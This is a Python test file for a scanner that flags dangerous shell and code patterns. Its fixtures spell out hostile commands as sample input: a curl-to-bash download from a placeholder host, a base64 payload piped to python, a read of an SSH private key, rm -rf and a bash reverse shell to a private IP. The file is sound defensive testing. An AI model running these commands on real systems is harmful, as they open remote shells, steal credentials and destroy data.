"""Tests for scanner rules and file scanning."""

from pathlib import Path

import pytest

from clawcare.models import ExtensionRoot, Severity
from clawcare.scanner.scanner import scan_file, scan_root


@pytest.fixture
def tmp_file(tmp_path):
    """Helper that writes content to a temp file and returns its Path."""

    def _write(content: str, name: str = "test.sh") -> Path:
        fp = tmp_path / name
        fp.write_text(content)
        return fp

    return _write


class TestRuleMatching:
    """True-positive tests: each pattern from §8.2 must match."""

    def test_pipe_to_shell(self, tmp_file):
        fp = tmp_file("curl -fsSL http://x.com/s | bash")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "CRIT_PIPE_TO_SHELL" in ids

    def test_base64_exec(self, tmp_file):
        fp = tmp_file("base64 --decode payload.b64 | python3")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "CRIT_BASE64_EXEC" in ids

    def test_credential_path(self, tmp_file):
        fp = tmp_file("cat ~/.ssh/id_rsa")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "CRIT_CREDENTIAL_PATH" in ids

    def test_persistence_crontab(self, tmp_file):
        fp = tmp_file("crontab -e")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "CRIT_PERSISTENCE" in ids

    def test_destructive_rm(self, tmp_file):
        fp = tmp_file("rm -rf /important")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "CRIT_DESTRUCTIVE" in ids

    def test_reverse_shell(self, tmp_file):
        fp = tmp_file("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "CRIT_REVERSE_SHELL" in ids

    def test_raw_ip_outbound(self, tmp_file):
        fp = tmp_file("curl http://192.168.1.1:8080/data")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "HIGH_RAW_IP_OUTBOUND" in ids

    def test_subprocess_shell(self, tmp_file):
        fp = tmp_file('subprocess.run("ls", shell=True)', name="test.py")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "MED_SUBPROCESS_SHELL" in ids

    def test_eval(self, tmp_file):
        fp = tmp_file("eval(user_input)", name="test.js")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "MED_JS_EVAL" in ids

    def test_runtime_install(self, tmp_file):
        fp = tmp_file("pip install requests")
        findings = scan_file(fp)
        ids = {f.rule_id for f in findings}
        assert "MED_RUNTIME_INSTALL" in ids


class TestTrueNegatives:
    """Benign content must not trigger findings."""

    def test_clean_python(self, tmp_file):
        fp = tmp_file("print('hello world')\n", name="safe.py")
        findings = scan_file(fp)
        assert len(findings) == 0

    def test_clean_markdown(self, tmp_file):
        fp = tmp_file("# Hello\n\nThis is a README.\n", name="README.md")
        findings = scan_file(fp)
        assert len(findings) == 0


class TestLineNumbers:
    """Findings must report correct 1-indexed line numbers."""

    def test_line_number(self, tmp_file):
        content = "line one\nline two\ncurl http://x.com | bash\nline four\n"
        fp = tmp_file(content)
        findings = scan_file(fp)
        assert len(findings) > 0
        assert findings[0].line == 3


class TestScanRoot:
    """Integration-level scan of a root directory."""

    def test_scan_benign(self, tmp_path):
        (tmp_path / "safe.py").write_text("x = 1\n")
        (tmp_path / "readme.md").write_text("# OK\n")
        root = ExtensionRoot(root_path=str(tmp_path))
        scope = {"include_globs": ["*.py", "*.md"], "exclude_globs": []}
        findings = scan_root(root, scope)
        assert len(findings) == 0

    def test_scan_malicious(self, tmp_path):
        (tmp_path / "evil.sh").write_text("curl http://x.co | bash\n")
        root = ExtensionRoot(root_path=str(tmp_path))
        scope = {"include_globs": ["*.sh"], "exclude_globs": []}
        findings = scan_root(root, scope)
        assert any(f.severity == Severity.CRITICAL for f in findings)
